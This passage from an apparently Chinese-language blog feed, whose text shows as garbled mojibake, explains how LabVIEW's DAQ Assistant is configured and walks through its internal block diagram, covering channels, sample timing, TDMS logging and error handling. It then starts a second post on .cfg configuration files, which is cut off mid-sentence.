<h4 id="é…ç½®ä¿¡å·é‡‡é›†å‚æ•°"><a href="#é…ç½®ä¿¡å·é‡‡é›†å‚æ•°" class="headerlink" title="é…ç½®ä¿¡å·é‡‡é›†å‚æ•°"></a>é…ç½®ä¿¡å·é‡‡é›†å‚æ•°</h4><p><img src="/assets/labview/daqAssistant/daqConfig.png" alt="DAQåŠ©æ‰‹é€šé“é…ç½®ç•Œé¢"></p>
<p>é…ç½®ç•Œé¢ä¸­å¯ä»¥è¿›è¡Œç‰©ç†é€šé“çš„åˆ é™¤ä¸æ·»åŠ ï¼Œé€šé“åç§°çš„ä¿®æ”¹ï¼Œæ¥çº¿ç«¯è¿æ¥æ–¹å¼çš„é€‰æ‹©ï¼Œé‡‡é›†æ¨¡å¼çš„é€‰æ‹©ç­‰æ“ä½œï¼Œé…ç½®ç•Œé¢å³ä¾§å¯¹äºæ¯ä¸ªé€‰é¡¹éƒ½æœ‰è¯¦ç»†è¯´æ˜ã€‚</p>
<p>ä¿¡å·é‡‡é›†æ¨¡å¼åŒ…å«â€œ1 é‡‡æ ·â€ã€â€œN é‡‡æ ·â€å’Œâ€œè¿ç»­é‡‡æ ·â€ 3 å¤§ç±»ã€‚å¯¹äºè¿ç»­é‡‡æ ·è€Œè¨€ï¼Œé‡‡æ ·ç‡å†³å®šäº†ä¿¡å·é‡‡æ ·çš„é—´éš”æ—¶é—´ï¼Œé€šå¸¸å°†å…¶è®¾ä¸ºæœ€å¤§æœ‰æ•ˆä¿¡å·é¢‘ç‡çš„ 10 å€å·¦å³ï¼›é‡‡æ ·ç‚¹æ•°æŒ‡å®šäº†è¿ç»­é‡‡æ ·æ—¶çš„æ•°æ®ç¼“å†²åŒºå¤§å°ï¼Œç®€å•æ¥è¯´ï¼Œå°±æ˜¯æ¯æ¬¡é‡‡æ ·åå¾—åˆ°çš„å¾…å¤„ç†æ•°æ®é•¿åº¦ï¼Œå¾…è¯»å–é‡‡æ ·ä¸é‡‡æ ·ç‡ä¹‹æ¯”å°±æ˜¯è¿ç»­é‡‡æ ·çš„é—´éš”æ—¶é—´ã€‚</p>
<p>æ­¤å¤–ï¼Œä¿¡å·è¾“å…¥èŒƒå›´é»˜è®¤ä¸º <code>-10~10v</code> ï¼›æ¥çº¿ç«¯é…ç½®é»˜è®¤ä¸ºå·®åˆ†è¾“å…¥ï¼Œé€šå¸¸æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬ä¼šé€‰æ‹©å•ç«¯è¾“å…¥ <code>RSE</code>ï¼Œè¡¨ç¤ºä¸€ç«¯æ¥ <code>AGND</code>ï¼Œä¸€ç«¯æ¥è¾“å…¥ç«¯å£ï¼Œä¸åŒçš„æ¥çº¿ç«¯é…ç½®æ–¹å¼å¯¹åº”çš„è¿çº¿å›¾ä¹Ÿä¸ä¸€è‡´ï¼Œåœ¨è¿›è¡Œä¿¡å·ç«¯å£è¿çº¿æ—¶éœ€è¦æŒ‰æ‰€é€‰æ–¹å¼è¿›è¡Œè¿æ¥ã€‚</p>
<h4 id="å¯ç”¨-TDMS-è®°å½•"><a href="#å¯ç”¨-TDMS-è®°å½•" class="headerlink" title="å¯ç”¨ TDMS è®°å½•"></a>å¯ç”¨ TDMS è®°å½•</h4><p><img src="/assets/labview/daqAssistant/saveTdms.png" alt="DAQåŠ©æ‰‹å¯ç”¨TDMSè®°å½•"></p>
<p>åœ¨é…ç½®ç•Œé¢ä¸­ï¼Œè¿˜å¯ä»¥é€‰æ‹©æ˜¯å¦å°†é‡‡é›†çš„æ•°æ®è®°å½•è‡³ <code>TDMS</code> æ–‡ä»¶ä¸­ï¼ŒåŒæ—¶å¯ä»¥é€‰æ‹©å¥½é»˜è®¤çš„å­˜å‚¨è·¯å¾„ã€è®°å½•æ¨¡å¼å’Œç»„åã€‚å¦‚æœä¿¡å·é‡‡é›†ç»“æŸåéœ€è¦å®æ—¶å¤„ç†ï¼Œéœ€è¦å°†è®°å½•æ¨¡å¼è®¾ä¸ºâ€œè®°å½•å¹¶è¯»å–â€ï¼Œå¦‚æœä»…ä»…æ˜¯è®°å½•è€Œæ— éœ€å¤„ç†ï¼Œåˆ™é€‰æ‹©â€œä»…è®°å½•â€ã€‚ç»„åå°†ä¼šæ˜¾ç¤ºåœ¨ <code>TDMS</code> æ–‡ä»¶çš„åˆ†ç»„åˆ—è¡¨ä¸­ã€‚</p>
<p>å¦‚æœè®°å½•æ—¶é—´å¾ˆé•¿ï¼Œé•¿è¾¾å‡ ä¸ªå°æ—¶ç”šè‡³å‡ å¤©æ—¶ï¼Œæ­¤æ—¶ç”±äºæ•°æ®é‡è¿‡å¤§ï¼Œå¯ä»¥å‹¾é€‰â€œåŒ…å«å¤šä¸ªæ–‡ä»¶â€ï¼Œå¹¶è§„å®šå•ä¸ªæ–‡ä»¶çš„å­˜å‚¨å®¹é‡ã€‚</p>
<h4 id="é…ç½®æ¥å£"><a href="#é…ç½®æ¥å£" class="headerlink" title="é…ç½®æ¥å£"></a>é…ç½®æ¥å£</h4><p><img src="/assets/labview/daqAssistant/daqIcon.png" alt="DAQåŠ©æ‰‹é…ç½®å®Œæˆå›¾"></p>
<p>å½“é‡‡é›†ä¿¡æ¯ç¡®å®šå¥½ä»¥åï¼Œä¼šåœ¨ç¨‹åºæ¡†å›¾ä¸­ç”Ÿæˆç›¸åº”çš„ <code>DAQ</code> å›¾æ ‡ï¼Œåç»­å¦‚æœéœ€è¦æ›´æ”¹å‚æ•°ï¼Œå¯ä»¥å‚è€ƒä»¥ä¸‹ä¸¤ç§æ–¹æ³•ï¼š</p>
<ol>
<li>åŒå‡» <code>DAQ</code> åŠ©æ‰‹ï¼Œæ‰“å¼€é…ç½®ç•Œé¢æ›´æ”¹éœ€è¦æ›´æ–°çš„å‚æ•°</li>
<li>é€šè¿‡ <code>DAQ</code> åŠ©æ‰‹æä¾›çš„è¾“å…¥æ¥å£ï¼Œä»å‰é¢æ¿æˆ–ç¨‹åºæ¡†å›¾ä¿®æ”¹ç›¸åº”å‚æ•°</li>
</ol>
<h2 id="DAQ-åŠ©æ‰‹ç¨‹åºè§£æ"><a href="#DAQ-åŠ©æ‰‹ç¨‹åºè§£æ" class="headerlink" title="DAQ åŠ©æ‰‹ç¨‹åºè§£æ"></a>DAQ åŠ©æ‰‹ç¨‹åºè§£æ</h2><p>å¯¹ <code>Express VI</code> è€Œè¨€ï¼ŒåŒå‡»æ— æ³•æ‰“å¼€ç¨‹åºæ¡†å›¾ï¼Œæ‰“å¼€çš„æ˜¯é…ç½®ç•Œé¢ã€‚æ­¤å¤–ï¼Œ<code>Express VI</code> çš„ç¨‹åºæ˜¯åŠ¨æ€çš„ï¼Œå¯¹äº <code>DAQ</code> åŠ©æ‰‹è€Œè¨€ï¼Œé€‰æ‹©ä¸åŒçš„é€šé“æ•°ï¼Œä¸åŒçš„ä¿¡å·ç±»å‹ï¼Œå…¶äº§ç”Ÿçš„æ‰§è¡Œç¨‹åºéƒ½ä¸ä¸€æ ·ã€‚ä¸‹é¢ä»¥åŒé€šé“è¿ç»­é‡‡é›†æ¨¡æ‹Ÿè¾“å…¥ç”µå‹ä¿¡å·ä¸ºä¾‹ï¼Œè§£æ <code>DAQ</code> åŠ©æ‰‹çš„å†…éƒ¨æ‰§è¡Œç¨‹åºã€‚</p>
<h3 id="Express-VI-è½¬æ ‡å‡†å­-VI"><a href="#Express-VI-è½¬æ ‡å‡†å­-VI" class="headerlink" title="Express VI è½¬æ ‡å‡†å­ VI"></a>Express VI è½¬æ ‡å‡†å­ VI</h3><p>æƒ³è¦æŸ¥çœ‹ <code>DAQ</code> åŠ©æ‰‹çš„ç¨‹åºæ¡†å›¾ï¼Œå¿…é¡»å…ˆå°†å…¶è½¬æ¢ä¸ºæ ‡å‡†å­ VIï¼Œè½¬æ¢æ–¹æ³•å¾ˆç®€å•ï¼Œé€‰æ‹© <code>DAQ</code> åŠ©æ‰‹ï¼Œå³é”®é€‰æ‹©â€œæ‰“å¼€å‰é¢æ¿â€æˆ–â€œopen front panelâ€ï¼ˆè‹±æ–‡ç‰ˆï¼‰ã€‚</p>
<h3 id="æ•´ä½“ç¨‹åºæ¡†å›¾"><a href="#æ•´ä½“ç¨‹åºæ¡†å›¾" class="headerlink" title="æ•´ä½“ç¨‹åºæ¡†å›¾"></a>æ•´ä½“ç¨‹åºæ¡†å›¾</h3><p><img src="/assets/labview/daqAssistant/daqDiagram.png" alt="DAQåŠ©æ‰‹ç¨‹åºæ¡†å›¾"></p>
<p>ä¸Šå›¾æ˜¯ <code>DAQ</code> åŠ©æ‰‹çš„ç¨‹åºæ¡†å›¾ï¼Œå¯ç®€åŒ–ä¸ºå¦‚ä¸‹å›¾æ‰€ç¤ºçš„ç¨‹åºæµç¨‹å›¾ï¼Œå›¾ä¸­çš„ä¸€å¯¹ç§»ä½å¯„å­˜å™¨ä»£æŒ‡çš„æ˜¯ä¿¡å·é‡‡é›†ä»»åŠ¡å¥æŸ„ã€‚</p>
<p><img src="/assets/labview/daqAssistant/daqDiagram_visio.png" alt="DAQåŠ©æ‰‹ç¨‹åºæ¡†å›¾"></p>
<h3 id="ç¨‹åºè§£æ"><a href="#ç¨‹åºè§£æ" class="headerlink" title="ç¨‹åºè§£æ"></a>ç¨‹åºè§£æ</h3><p>ä¸‹é¢å¯¹ä»¥ä¸Šç¨‹åºæ¡†å›¾ä¸­çš„æ¯ä¸ªæ¨¡å—è¿›è¡Œè¯¦ç»†åˆ†æã€‚</p>
<h4 id="åˆ›å»ºé‡‡é›†ä»»åŠ¡"><a href="#åˆ›å»ºé‡‡é›†ä»»åŠ¡" class="headerlink" title="åˆ›å»ºé‡‡é›†ä»»åŠ¡"></a>åˆ›å»ºé‡‡é›†ä»»åŠ¡</h4><p><img src="/assets/labview/daqAssistant/daqDiagram_1.png" alt="DAQåŠ©æ‰‹å±€éƒ¨ç¨‹åºæ¡†å›¾1"></p>
<p>å›¾ä¸­åŒ…å«ä¸¤ä¸ªç§»ä½å¯„å­˜å™¨ï¼Œä¸Šé¢çš„å¯„å­˜å™¨ç”¨äºå­˜å‚¨é‡‡é›†ä»»åŠ¡çš„å¼•ç”¨å¥æŸ„ï¼Œå½“è¯¥å¥æŸ„æ— æ•ˆæˆ–é¦–æ¬¡è°ƒç”¨è¯¥ VI æ—¶ä¼šæ‰§è¡Œ <code>DAQmx Create Task</code> å‡½æ•°ï¼Œå³åˆ›å»ºæ–°çš„é‡‡é›†ä»»åŠ¡ï¼Œå¹¶äº§ç”Ÿæ–°ä»»åŠ¡çš„å¼•ç”¨å¥æŸ„ã€‚</p>
<h4 id="ç”Ÿæˆé€šé“åç§°"><a href="#ç”Ÿæˆé€šé“åç§°" class="headerlink" title="ç”Ÿæˆé€šé“åç§°"></a>ç”Ÿæˆé€šé“åç§°</h4><p><img src="/assets/labview/daqAssistant/daqDiagram_2.png" alt="DAQåŠ©æ‰‹å±€éƒ¨ç¨‹åºæ¡†å›¾2"></p>
<p>æ·»åŠ ç‰©ç†é€šé“å‰ï¼Œéœ€è¦é€‰æ‹©å¥½ç›¸åº”çš„é€šé“åç§°ï¼Œæ¨¡æ‹Ÿè¾“å…¥ä¿¡å·ç®€ç§° <code>ai</code>ï¼Œé€šé“åç§°æ ¼å¼ä¸º <code>ain</code>, n ä» 0 å¼€å§‹å¢åŠ ã€‚åœ¨æ­¤ä¾‹ä¸­ï¼Œæ‰€é€‰é€šé“ä¸º <code>ai0</code> ä¸ <code>ai1</code>ã€‚è®¾å¤‡åä¸º <code>Dev1</code>,æ‰€ä»¥æœ€ç»ˆå¾—åˆ°çš„é€šé“åç§°ä¸º <code>Dev1/ai0</code> ä¸ <code>Dev1/ai1</code>ã€‚æ­£å¸¸æƒ…å†µä¸‹ï¼Œè¯¥æ¡ä»¶ç»“æ„å†…çš„ç¨‹åºä»…åœ¨é¦–æ¬¡è°ƒç”¨æ—¶æ‰§è¡Œä¸€æ¬¡ã€‚</p>
<h4 id="æ·»åŠ ç‰©ç†é€šé“"><a href="#æ·»åŠ ç‰©ç†é€šé“" class="headerlink" title="æ·»åŠ ç‰©ç†é€šé“"></a>æ·»åŠ ç‰©ç†é€šé“</h4><p><img src="/assets/labview/daqAssistant/daqDiagram_3.png" alt="DAQåŠ©æ‰‹å±€éƒ¨ç¨‹åºæ¡†å›¾3"></p>
<p>ç¡®å®šå¥½é€šé“åç§°åï¼Œä¾¿å¯æ ¹æ®éœ€æ±‚æ·»åŠ ç›¸åº”çš„ç‰©ç†é€šé“äº†ï¼Œå¦‚å›¾æ‰€ç¤ºï¼Œæ ‡å¿— â‘  è¿æ¥çš„æ˜¯è¾“å…¥æ¥çº¿ç«¯é…ç½®å‚æ•°ï¼Œå¾€ä¸‹çš„å‚æ•°å¯ä»¥å‚è€ƒå¦‚ä¸‹çš„å‡½æ•° <code>IO</code> æ¥å£å›¾ã€‚ä¹‹æ‰€ä»¥ç”¨ <code>for</code> å¾ªç¯ï¼Œæ˜¯å› ä¸ºæ¯ä¸ªé‡‡é›†é€šé“å‡éœ€è°ƒç”¨ä¸€æ¬¡ <code>DAQmx Create Channel</code> å‡½æ•°ã€‚æœ¬ä¾‹åˆ›å»ºçš„é€šé“æ•°ä¸º 2ï¼Œæ‰€ä»¥ <code>for</code> å¾ªç¯çš„æ‰§è¡Œæ¬¡æ•°ä¸º 2ã€‚</p>
<p><img src="/assets/labview/daqAssistant/daqDiagram_3_1.png" alt="DAQåŠ©æ‰‹å±€éƒ¨ç¨‹åºæ¡†å›¾3-1"></p>
<h4 id="é…ç½®é‡‡æ ·æ—¶é’Ÿ"><a href="#é…ç½®é‡‡æ ·æ—¶é’Ÿ" class="headerlink" title="é…ç½®é‡‡æ ·æ—¶é’Ÿ"></a>é…ç½®é‡‡æ ·æ—¶é’Ÿ</h4><p><img src="/assets/labview/daqAssistant/daqDiagram_4.png" alt="DAQåŠ©æ‰‹å±€éƒ¨ç¨‹åºæ¡†å›¾4"></p>
<p>å¯¹äºè¿ç»­é‡‡æ ·æ¨¡å¼ï¼Œå¿…é¡»è°ƒç”¨ <code>DAQmx Timing</code> å®šæ—¶å‡½æ•°ï¼Œé…ç½®å¥½é‡‡æ ·ç‡å’Œé‡‡æ ·ç‚¹æ•°ã€‚ä½†åœ¨æ­¤å¤„éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œ<code>DAQ</code> åŠ©æ‰‹å¹¶æ²¡æœ‰å®ç°é‡‡é›†è¿‡ç¨‹ä¸­ä¿®æ”¹é‡‡æ ·é¢‘ç‡ <code>Sample rate</code> çš„åŠŸèƒ½ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼šåœ¨ä¿¡å·é‡‡é›†è¿‡ç¨‹ä¸­ï¼Œæ— æ³•ä¿®æ”¹é‡‡æ ·é¢‘ç‡ï¼Œç›´åˆ°é‡‡é›†ä»»åŠ¡å‡ºé”™æˆ–åœæ­¢ã€‚å¦‚æœå®é™…åº”ç”¨ä¸­æœ‰é‡‡é›†è¿‡ç¨‹ä¸­ä¿®æ”¹é‡‡æ ·ç‡çš„éœ€æ±‚ï¼Œåªèƒ½å¦è¡Œç¼–å†™é‡‡é›†ç¨‹åºï¼Œè¿™ä¹Ÿæ˜¯ <code>Express VI</code> ä¸å¤Ÿçµæ´»çš„ä¸€ä¸ªä½“ç°ã€‚</p>
<h4 id="é…ç½®-TDMS-è®°å½•"><a href="#é…ç½®-TDMS-è®°å½•" class="headerlink" title="é…ç½® TDMS è®°å½•"></a>é…ç½® TDMS è®°å½•</h4><p><img src="/assets/labview/daqAssistant/daqDiagram_5.png" alt="DAQåŠ©æ‰‹å±€éƒ¨ç¨‹åºæ¡†å›¾5"></p>
<p><code>TDMS</code> æ–‡ä»¶è®°å½•æ˜¯éå¸¸å¸¸ç”¨çš„åŠŸèƒ½ï¼Œå¯ä»¥å°†é‡‡é›†åˆ°çš„ä¿¡å·å¿«é€Ÿå­˜å‚¨è‡³ <code>.tdms</code> æ–‡ä»¶ä¸­ã€‚ä½¿ç”¨ <code>DAQmx Configure Logging(TDMS)</code> å‡½æ•°é…ç½® <code>TDMS</code> è®°å½•åŠŸèƒ½æ—¶ï¼Œå¯å‚è€ƒå¦‚ä¸‹æ¥å£ï¼Œè®¾ç½®å¥½è®°å½•æ¨¡å¼ã€ç»„åã€æ–‡ä»¶è·¯å¾„ç­‰ã€‚</p>
<p><img src="/assets/labview/daqAssistant/daqDiagram_5_1.png" alt="DAQåŠ©æ‰‹å±€éƒ¨ç¨‹åºæ¡†å›¾5-1"></p>
<h4 id="å¼€å§‹ä»»åŠ¡"><a href="#å¼€å§‹ä»»åŠ¡" class="headerlink" title="å¼€å§‹ä»»åŠ¡"></a>å¼€å§‹ä»»åŠ¡</h4><p><img src="/assets/labview/daqAssistant/daqDiagram_6.png" alt="DAQåŠ©æ‰‹å±€éƒ¨ç¨‹åºæ¡†å›¾6"></p>
<p>å½“é‡‡é›†ä»»åŠ¡ç›¸å…³çš„å‚æ•°éƒ½é…ç½®å®Œæˆåï¼Œå³å¯å¼€å§‹ä»»åŠ¡ <code>DAQmx Start Task</code>ã€‚</p>
<p>æ­¤å‰ 6 ä¸ªæ­¥éª¤ä»…éœ€æ‰§è¡Œä¸€æ¬¡ï¼Œç›´åˆ°ä¸‹ä¸€æ¬¡é‡å¯è½¯ä»¶æˆ–å‡ºç°å¼‚å¸¸ã€‚</p>
<h4 id="ä¿¡å·é‡‡é›†"><a href="#ä¿¡å·é‡‡é›†" class="headerlink" title="ä¿¡å·é‡‡é›†"></a>ä¿¡å·é‡‡é›†</h4><p><img src="/assets/labview/daqAssistant/daqDiagram_7.png" alt="DAQåŠ©æ‰‹å±€éƒ¨ç¨‹åºæ¡†å›¾7"></p>
<p>å¼€å§‹ä»»åŠ¡åï¼Œç‰©ç†é‡‡é›†å¡å°±å°†æŒ‰ç…§ç»™å®šçš„å‚æ•°å¼€å§‹é‡‡é›†ï¼Œå¹¶å°†æ•°æ®å­˜æ”¾è‡³é‡‡é›†å¡å†…çš„ç¼“å†²åŒºå†…ï¼Œé€šè¿‡ç›¸åº”çš„ <code>DAQmx Read</code> å‡½æ•°ï¼Œé€‰æ‹©åˆé€‚çš„é‡‡æ ·æ–¹å¼ï¼ˆæ­¤å¤„é€‰ä¸ºâ€œæ¨¡æ‹Ÿ1Dæ³¢å½¢Né€šé“Né‡‡æ ·â€ï¼‰ï¼Œ <code>DAQ</code> é©±åŠ¨ç¨‹åºä¾¿ä¼šä»é‡‡é›†å¡çš„ç¼“å†²åŒºä¸­è¯»å–æ•°æ®ï¼Œå¹¶é»˜è®¤ä»¥åŠ¨æ€æ•°æ®æ ¼å¼ DDT(Dynamic Data Type) è¾“å‡ºã€‚<code>DAQ</code> åŠ©æ‰‹è¿”å›çš„åŠ¨æ€æ•°æ®ä¾¿æ˜¯è¯¥å‡½æ•°è¿”å›çš„æ•°æ® <code>data</code>ã€‚</p>
<h4 id="å¼‚å¸¸å¤„ç†"><a href="#å¼‚å¸¸å¤„ç†" class="headerlink" title="å¼‚å¸¸å¤„ç†"></a>å¼‚å¸¸å¤„ç†</h4><p><img src="/assets/labview/daqAssistant/daqDiagram_8.png" alt="DAQåŠ©æ‰‹å±€éƒ¨ç¨‹åºæ¡†å›¾8"></p>
<p>æ‰€è°“å¼‚å¸¸å¤„ç†ï¼ŒæŒ‡çš„æ³¨æ„å¼‚å¸¸æƒ…å†µæ˜¯é‡‡é›†å¡åœ¨ä¿¡å·é‡‡é›†è¿‡ç¨‹ä¸­è¢«æ‹”å‡ºï¼Œå¯¼è‡´é‡‡é›†ä»»åŠ¡æ— æ³•ç»§ç»­æ‰§è¡Œï¼Œæ­¤æ—¶ <code>DAQ</code> åŠ©æ‰‹å°†ä¼šåœæ­¢å¹¶æ¸…é™¤ä»»åŠ¡ï¼Œå¹¶å°†ä»»åŠ¡çš„å¼•ç”¨å¥æŸ„é‡ç½®ä¸ºç©ºã€‚ä¸‹ä¸€æ¬¡ while å¾ªç¯å°†åˆ¤æ–­å‡ºè¯¥ç©ºå¥æŸ„ï¼Œç„¶åé‡æ–°åˆ›å»ºä»»åŠ¡ï¼Œå¦‚æœé‡‡é›†ä»»åŠ¡è¢«é¡ºåˆ©åˆ›å»ºï¼Œè¯´æ˜å¼‚å¸¸å·²è§£é™¤ï¼Œé‡‡é›†å¡å·²é‡æ–°è¿æ¥ï¼Œé‡‡é›†ä»»åŠ¡ä¾¿å¯è‡ªåŠ¨ç»§ç»­è¿›è¡Œï¼›å¦‚æœé‡‡é›†ä»»åŠ¡åˆ›å»ºå¤±è´¥ï¼Œåˆ™å¾ªç¯åˆ›å»ºä»»åŠ¡ç›´åˆ°æˆåŠŸä¸ºæ­¢ã€‚</p>
<p>å½“ç„¶è¿˜æœ‰ä¸€ç§éå¼‚å¸¸æƒ…å†µä¹Ÿä¼šåœæ­¢å¹¶æ¸…é™¤ä»»åŠ¡ï¼Œé‚£å°±æ˜¯ç”¨æˆ·æ‰‹åŠ¨ç‚¹å‡»åœæ­¢æŒ‰é’® stop ï¼Œä»»åŠ¡æ­£å¸¸ç»ˆæ­¢ã€‚</p>
<h2 id="DAQ-åŠ©æ‰‹ç¨‹åºç®€åŒ–"><a href="#DAQ-åŠ©æ‰‹ç¨‹åºç®€åŒ–" class="headerlink" title="DAQ åŠ©æ‰‹ç¨‹åºç®€åŒ–"></a>DAQ åŠ©æ‰‹ç¨‹åºç®€åŒ–</h2><p>ä»ä¸Šé¢çš„è§£æå¯ä»¥çœ‹å‡ºï¼Œ<code>DAQ</code> åŠ©æ‰‹ä½œä¸ºé€šç”¨å‹å·¥å…·ï¼ŒåŒ…å«äº†æ‰€æœ‰éœ€è¦çš„é…ç½®å‚æ•°ã€‚<code>DAQ</code> åŠ©æ‰‹æœ‰å…¶æ–¹ä¾¿ä¹‹å¤„ï¼Œä½†åŒæ—¶ä¹Ÿå­˜åœ¨è®¸å¤šä¸çµæ´»çš„åœ°æ–¹ï¼š</p>
<ol>
<li>ç»æµ‹è¯•ï¼Œå¯¹äºå•é€šé“å’Œ N é€šé“çš„é‡‡é›†ä»»åŠ¡ï¼ŒDAQ åŠ©æ‰‹çš„æ‰§è¡Œç¨‹åºç»“æ„å®Œå…¨ä¸€è‡´ï¼Œç”Ÿæˆé€šé“åç§°å’Œæ·»åŠ ç‰©ç†é€šé“å‡é‡‡ç”¨äº† for å¾ªç¯ç»“æ„ï¼Œè¿™å¯¹å•é€šé“é‡‡é›†åŸæœ¬æ˜¯ä¸éœ€è¦çš„ï¼›</li>
<li>å®é™…åº”ç”¨ä¸­ï¼Œæ·»åŠ ç‰©ç†é€šé“æ—¶ï¼Œæœ‰è®¸å¤šå‚æ•°ä½¿ç”¨é»˜è®¤å€¼å³å¯ï¼Œè¿‡å¤šçš„å‚æ•°åªä¼šä½¿ä»£ç æ˜¾å¾—å†—ä½™ï¼›</li>
<li>ä¸Šè¿°æåŠçš„ä¸€ä¸ªé—®é¢˜ï¼šæ— æ³•åœ¨é‡‡é›†è¿‡ç¨‹ä¸­ä¿®æ”¹é‡‡æ ·ç‡ï¼›</li>
<li>å­˜å‚¨ TDMS æ–‡ä»¶æ—¶ï¼Œé»˜è®¤ä¼šå­˜å‚¨æ‰€æœ‰é€šé“çš„æ•°æ®ï¼Œæ— æ³•å•ç‹¬æŒ‡å®šéœ€è¦è¿›è¡Œæ•°æ®å­˜å‚¨çš„é€šé“ï¼›</li>
<li>è‹¥è¦é‡‡é›†ç¼–ç å™¨çš„è®¡æ•°å€¼æ—¶ï¼Œä½¿ç”¨ <code>DAQ</code> åŠ©æ‰‹çš„é…ç½®ç•Œé¢æ— æ³•è¿”å›æ•´å‹çš„åŸå§‹è®¡æ•°å€¼ã€‚</li>
</ol>
<p>é‰´äºä»¥ä¸Šç§ç§åŸå› ï¼Œåœ¨å®é™…ç¼–ç¨‹è¿‡ç¨‹ä¸­ï¼Œå®Œå…¨å¯ä»¥ä½¿ç”¨åº•å±‚çš„ <code>DAQmx</code> å‡½æ•°ç¼–å†™ä¿¡å·é‡‡é›†ç¨‹åºï¼Œæˆ–è€…åœ¨åŸæœ‰çš„ <code>DAQ</code> åŠ©æ‰‹ç¨‹åºåŸºç¡€ä¸Šä¿®æ”¹å’Œç®€åŒ–ã€‚</p>
<h3 id="ç®€åŒ–åç¨‹åº"><a href="#ç®€åŒ–åç¨‹åº" class="headerlink" title="ç®€åŒ–åç¨‹åº"></a>ç®€åŒ–åç¨‹åº</h3><p>æ­¤å¤„æä¾›ä¸€ä¸ªå°†ä¸Šè¿°ä»£ç ç®€åŒ–å¹¶æ·»åŠ é‡‡æ ·ç‡å¯ä¿®æ”¹çš„ç¨‹åºã€‚</p>
<p><img src="/assets/labview/daqAssistant/daqCustomsize.png" alt="DAQåŠ©æ‰‹ç®€åŒ–æ”¹è¿›ç‰ˆ"></p>
<p>åœ¨è¯¥ä¿®æ”¹ç‰ˆä¸­ï¼Œå»æ‰äº†å¤§é‡çš„é»˜è®¤å‚æ•°ï¼Œå‡å°‘äº†æ¡ä»¶åˆ†æ”¯ä¸ªæ•°ï¼›æ·»åŠ äº†ä¸€ä¸ªåé¦ˆèŠ‚ç‚¹ï¼Œç”¨ä»¥åˆ¤æ–­é‡‡æ ·ç‡çš„å˜åŒ–æƒ…å†µï¼Œåœ¨é‡‡æ ·ç‡æ”¹å˜æ—¶ï¼Œè¯¥ç¨‹åºå°†åˆ é™¤åŸæœ‰ä»»åŠ¡ï¼Œå¹¶é‡æ–°åˆ›å»ºæ–°çš„ä»»åŠ¡ã€‚</p>
<h3 id="ä¸‹è½½é“¾æ¥"><a href="#ä¸‹è½½é“¾æ¥" class="headerlink" title="ä¸‹è½½é“¾æ¥"></a>ä¸‹è½½é“¾æ¥</h3><p><a href="http://pan.baidu.com/s/1i50wss9" target="_blank" rel="noopener">http://pan.baidu.com/s/1i50wss9</a></p>
]]></content>
      
        <categories>
            
            <category> LabVIEW </category>
            
        </categories>
        
        
        <tags>
            
            <tag> labview </tag>
            
            <tag> tdms </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Labview - å­˜å‚¨ .cfg é…ç½®æ–‡ä»¶]]></title>
      <url>https://www.litreily.top/2017/03/25/labview-cfg/</url>
      <content type="html"><![CDATA[<h2 id="é…ç½®æ–‡ä»¶ç®€ä»‹"><a href="#é…ç½®æ–‡ä»¶ç®€ä»‹" class="headerlink" title="é…ç½®æ–‡ä»¶ç®€ä»‹"></a>é…ç½®æ–‡ä»¶ç®€ä»‹</h2><p>åœ¨ LabVIEW åº”ç”¨è½¯ä»¶å¼€å‘è¿‡ç¨‹ä¸­ï¼Œå¯¹äºç¨å¾®å¤§å‹ä¸€ç‚¹çš„è½¯ä»¶è€Œè¨€ï¼Œä¸€èˆ¬éƒ½éœ€è¦åœ¨æœ¬åœ°æ–‡ä»¶ä¸­ä¿å­˜ä¸€äº›é…ç½®å‚æ•°ï¼Œå¦‚åœ¨ windows ç³»ç»Ÿä¸­å®‰è£…è½¯ä»¶æ—¶ï¼Œå®‰è£…ç¨‹åºåœ¨ C ç›˜ documents æ–‡ä»¶å¤¹ä¸‹è‡ªåŠ¨åˆ›å»ºçš„ç”¨æˆ·æ•°æ®ã€‚å¯¹äºéœ€è¦æ›´æ–°çš„é…ç½®å‚æ•°æˆ–è€…é‡è¦çš„å¸¸å€¼å‚æ•°ï¼Œåœ¨ LabVIEW ä¸­å¯ä»¥ä½¿ç”¨ <code>.cfg</code> æ ¼å¼çš„é…ç½®æ–‡ä»¶è¿›è¡Œå­˜å‚¨ä¸è¯»å–ã€‚</p>
<h3 id="åº”ç”¨åœºåˆ"><a href="#åº”ç”¨åœºåˆ" class="headerlink" title="åº”ç”¨åœºåˆ"></a>åº”ç”¨åœºåˆ</h3><ul>
<li>è½¯ä»¶çš„å…¨å±€é…ç½®å‚æ•°ï¼ˆå¦‚ï¼šä¸²å£é€šè®¯å‚æ•°ï¼ŒDAQ é‡‡æ ·å‚æ•°ï¼Œä¿¡å·å¤„ç†å‚æ•°ï¼ŒÂ·Â·Â·ï¼‰</li>
<li>è½¯ä»¶ä¸»ç•Œé¢å…³é—­å‰çš„è¾“å…¥ã€è¾“å‡ºæ§ä»¶çš„æœ€æ–°æ•°å€¼</li>
<li>æŠ¥è¡¨ç”Ÿæˆæ—¶çš„é»˜è®¤ä¿¡æ¯ï¼ˆå¦‚ï¼šç½²åï¼Œæ ‡é¢˜ï¼Œæ‘˜è¦ï¼ŒÂ·Â·Â·ï¼‰</li>
<li>ç»Ÿè®¡é‡ï¼ˆå¦‚ï¼šæ¸¸æˆæœ€é«˜åˆ†ï¼Œæ’è¡Œæ¦œæ’åï¼Œå‚ä¸æ¬¡æ•°ï¼ŒÂ·Â·Â·ï¼‰</li>
<li>Â·Â·Â·</li>
</ul>
<h3 id="cfg-æ–‡ä»¶æ ¼å¼"><a href="#cfg-æ–‡ä»¶æ ¼å¼" class="headerlink" title=".cfg æ–‡ä»¶æ ¼å¼"></a>.cfg æ–‡ä»¶æ ¼å¼</h3><p>å¦‚ä¸‹æ‰€ç¤ºï¼Œ<code>.cfg</code> æ–‡ä»¶çš„æ•°æ®å­˜å‚¨æ ¼å¼æ ¼å¼æ»¡è¶³æ ‡è®°æ€§è¯­è¨€çš„ç‰¹ç‚¹ï¼Œæœ‰ç‚¹ç±»ä¼¼äº <code>JSON</code> å’Œ <code>XML</code>ï¼Œä½†ä¸ä¹‹ä¸åŒçš„æ˜¯ <code>.cfg</code> ä¸æ”¯æŒæ•°æ®åµŒå¥—ã€‚<code>.cfg</code> 